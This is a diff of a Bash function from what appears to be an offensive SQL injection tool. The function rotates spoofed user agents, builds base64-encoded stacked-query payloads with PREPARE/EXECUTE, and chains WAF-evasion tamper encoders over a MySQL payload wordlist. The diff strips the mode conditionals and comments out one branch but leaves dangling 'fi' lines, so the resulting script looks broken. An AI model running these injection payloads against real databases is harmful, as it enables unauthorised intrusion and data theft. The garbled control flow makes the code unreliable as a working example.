@@ -141,29 +141,26 @@ vector_sqli_agressor_left() {
 
         local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
         local random_ua="$base_ua"
-        if [ "$HATE_MODE" = "true" ]; then
             local ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
             random_ua="${base_ua} Chrome/$((RANDOM % 10 + 120)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36 Build/${ua_salt}"
         fi
 
         local defiance_tamper_path=""
         local final_query=""
-
-        if [ "$HATE_MODE" = "true" ]; then
             local b64_payload=$(base64_engine "$query_payload")
             defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
             final_query="${default_path}${defiance_tamper_path}"
-        else
-            local t1=$(between_engine "$default_path")
-            local t2=$(charencode_engine "$t1")
-            local t3=$(apostrophenullencode_engine "$t2")
-            local t4=$(randomcase_engine "$t3")
-            local t5=$(space2comment_engine "$t4")
-            local t6=$(appendnullbyte_engine "$t5")
-            local t7=$(xor_engine "$t6")
-            defiance_tamper_path=$(weirdcomment_engine "$t7")
+    #    else
+      #      local t1=$(between_engine "$default_path")
+         #   local t2=$(charencode_engine "$t1")
+       #     local t3=$(apostrophenullencode_engine "$t2")
+     #       local t4=$(randomcase_engine "$t3")
+       #     local t5=$(space2comment_engine "$t4")
+         #   local t6=$(appendnullbyte_engine "$t5")
+        #    local t7=$(xor_engine "$t6")
+      #     defiance_tamper_path=$(weirdcomment_engine "$t7")
 
-            if [[ "$WORDLIST_MYSQL" == *"nonphp"* ]]; then
+            if [[ "$WORDLIST_MYSQL" == *"nonphp"* || "$WORDLIST_MYSQL" == *"HAHA"* ]]; then
                 final_query="${defiance_tamper_path}${query_payload}"
             else
                 if [[ "$defiance_tamper_path" == *"="* ]]; then
@@ -195,11 +192,7 @@ vector_sqli_agressor_left() {
                 echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
             fi
         fi
-
-        if [ "$HATE_MODE" = "true" ]; then
             sleep $((RANDOM % 6 + 4))
-        else
-            sleep 5
         fi
     done < <(shuf "$WORDLIST_MYSQL")
 }
